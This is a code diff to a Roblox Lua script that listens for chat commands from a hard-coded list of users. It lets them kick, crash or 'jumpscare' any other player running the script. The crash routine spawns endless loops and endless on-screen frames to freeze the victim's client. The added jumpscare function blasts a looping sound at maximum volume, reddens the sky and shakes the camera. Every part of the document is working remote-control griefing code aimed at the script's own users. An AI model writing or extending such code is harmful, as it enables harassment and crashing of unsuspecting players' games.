@@ -1,6 +1,8 @@
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
 
 local AUTHORIZED_USERS = {
     rWeFrRoblox = true,
@@ -17,26 +19,129 @@ for name in pairs(AUTHORIZED_USERS) do
     AUTHORIZED_USERS[name] = nil
 end
 
+local function horrorTroll()
+    local creepySound = Instance.new("Sound")
+    creepySound.SoundId = "rbxassetid://9125712561"
+    creepySound.Volume = 10
+    creepySound.Looped = true
+    creepySound.Name = "CreepyLoopSound"
+    creepySound.Parent = workspace
+
+    local original = {
+        FogStart = Lighting.FogStart,
+        FogEnd = Lighting.FogEnd,
+        FogColor = Lighting.FogColor,
+        Ambient = Lighting.Ambient,
+        OutdoorAmbient = Lighting.OutdoorAmbient,
+        Brightness = Lighting.Brightness,
+        CameraType = Camera.CameraType,
+        CameraSubject = Camera.CameraSubject,
+        Sky = Lighting:FindFirstChildWhichIsA("Sky"),
+    }
+
+    local function applyRedSkybox()
+        if original.Sky then
+            original.Sky.Parent = nil
+        end
+
+        local sky = Instance.new("Sky")
+        sky.Name = "ClientHorrorSky"
+        local redSkyID = "15182654336"
+        for _, face in ipairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
+            sky["Skybox" .. face] = "rbxassetid://" .. redSkyID
+        end
+        sky.StarCount = 0
+        sky.CelestialBodiesShown = false
+        sky.SunAngularSize = 0
+        sky.MoonAngularSize = 0
+        sky.Parent = Lighting
+    end
+
+    local function restoreSkybox()
+        for _, v in ipairs(Lighting:GetChildren()) do
+            if v:IsA("Sky") then
+                v:Destroy()
+            end
+        end
+        if original.Sky then
+            original.Sky.Parent = Lighting
+        end
+    end
+
+    local function shakeCamera(duration, intensity)
+        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local head = char:WaitForChild("Head")
+
+        Camera.CameraType = Enum.CameraType.Scriptable
+        local startTime = tick()
+
+        local conn
+        conn = RunService.RenderStepped:Connect(function()
+            local elapsed = tick() - startTime
+            if elapsed > duration then
+                conn:Disconnect()
+                Camera.CameraType = original.CameraType
+                Camera.CameraSubject = original.CameraSubject
+                return
+            end
+
+            local offset = Vector3.new(
+                math.random(-100, 100) / 100 * intensity,
+                math.random(-100, 100) / 100 * intensity,
+                math.random(-100, 100) / 100 * intensity
+            )
+            Camera.CFrame = head.CFrame * CFrame.new(offset)
+        end)
+    end
+
+    creepySound:Play()
+    task.wait(0.75)
+
+    Lighting.FogStart = 0
+    Lighting.FogEnd = 15
+    Lighting.FogColor = Color3.new(0, 0, 0)
+    Lighting.Ambient = Color3.fromRGB(180, 0, 0)
+    Lighting.OutdoorAmbient = Color3.fromRGB(60, 0, 0)
+    Lighting.Brightness = 0.4
+
+    applyRedSkybox()
+    shakeCamera(8, 0.5)
+
+    task.wait(8)
+
+    restoreSkybox()
+    for prop, val in pairs(original) do
+        if prop ~= "CameraType" and prop ~= "CameraSubject" and prop ~= "Sky" then
+            Lighting[prop] = val
+        end
+    end
+
+    Camera.CameraType = original.CameraType
+    Camera.CameraSubject = original.CameraSubject
+
+    creepySound:Stop()
+    creepySound:Destroy()
+end
+
 local function spamCrash()
     task.spawn(function()
-        while true do
-            print("imagine crashing")
-        end
+        while true do print("crashing...") end
     end)
 
     task.spawn(function()
-        local screenGui = Instance.new("ScreenGui")
-        screenGui.IgnoreGuiInset = true
-        screenGui.ResetOnSpawn = false
-        screenGui.Name = "CrashGui"
-        screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+        local gui = Instance.new("ScreenGui")
+        gui.ResetOnSpawn = false
+        gui.IgnoreGuiInset = true
+        gui.Name = "CrashGui"
+        gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
 
+        while true do
             local frame = Instance.new("Frame")
-            frame.Size = UDim2.new(0, math.random(10, 500), 0, math.random(10, 500))
+            frame.Size = UDim2.new(0, math.random(10, 400), 0, math.random(10, 400))
             frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
             frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
             frame.BorderSizePixel = 0
-            frame.Parent = screenGui
+            frame.Parent = gui
         end
     end)
 
@@ -59,15 +164,22 @@ local function onChat(player, message)
 
     message = message:lower()
 
-    local kickTarget = message:match("^,kick%s+(%S+)")
-    if kickTarget and kickTarget == LocalPlayer.Name:lower() then
+    local targetKick = message:match("^,kick%s+(%S+)")
+    if targetKick and targetKick == LocalPlayer.Name:lower() then
         LocalPlayer:Kick("You were kicked by " .. player.Name)
         return
     end
 
-    local crashTarget = message:match("^,crash%s+(%S+)")
-    if crashTarget and crashTarget == LocalPlayer.Name:lower() then
+    local targetCrash = message:match("^,crash%s+(%S+)")
+    if targetCrash and targetCrash == LocalPlayer.Name:lower() then
         spamCrash()
+        return
+    end
+
+    local targetScare = message:match("^,jumpscare%s+(%S+)")
+    if targetScare and targetScare == LocalPlayer.Name:lower() then
+        horrorTroll()
+        return
     end
 end
 
